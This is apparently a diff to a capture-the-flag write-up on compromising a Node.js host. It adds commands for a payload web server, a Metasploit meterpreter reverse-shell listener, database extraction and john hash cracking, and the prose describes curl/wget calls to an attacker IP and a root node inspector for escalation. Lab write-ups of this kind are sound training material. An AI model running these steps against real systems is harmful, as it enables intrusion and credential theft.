@@ -22,7 +22,7 @@ We get the following
 ```
 
 PORT     STATE SERVICE VERSION
-3000/tcp open  ppp?
+3000/tcp open  ppp? (fingerprint shows HTTP using NodeJS)
 | fingerprint-strings: 
 |   GetRequest: 
 |     HTTP/1.1 200 OK
@@ -78,6 +78,11 @@ Content-Disposition: form-data; name="1"
 ```
 
 <h2>Gaining Access/Exploitation</h2>
+
+```
+python3 -m http.server 80
+```
+
 Let's test this exploit. We edit the request above by changing the Host to our IP and 'xcalc' to 'curl http://10.10.14.9'. We start a python web server and send the request. We get a request from the host on our web server. This exploit works.
 
 We then create a meterpreter reverse shell using msfvenom and save it in the same directory as our web server root.
@@ -90,13 +95,39 @@ We send the request above using Burp and edit the command to "wget http://10.10.
 
 We start a listener in Meterpreter, then we send two requests, one adding execution to the file, and the other executing it. Our Meterpreter reverse-shell is active. 
 
+```
+msfconsole
+use multi/handler
+set payload linux/x86/meterpreter/reverse_tcp
+set LHOST 10.10.14.9
+set LPORT 1313
+run
+```
+
 We are in the root directory of the site. We see reactor.db and download it. Using sqlite3, we find the users table has hashes for administrator and engineer. We grab those and run john against them. 
+
+```
+download reactor.db
+sqlite3 reactor.db
+.tables
+SELECT * FROM users;
+```
+
+```
+john hashes --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
+```
+
 
 John gives us the password for engineer: reactor1. 
 
 We can now ssh into the host and grab the user flag.
 
 Looking into running processes using ps -aux shows us that root is running node on inspector mode out of port 9229. 
+
+```
+root        1379  0.0  1.3 1068608 51500 ?       Ssl  Jun02   0:05 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
+```
+
 
 We find that you can connect to the node process using node inspect localhost:9229 on the victim host. 
 
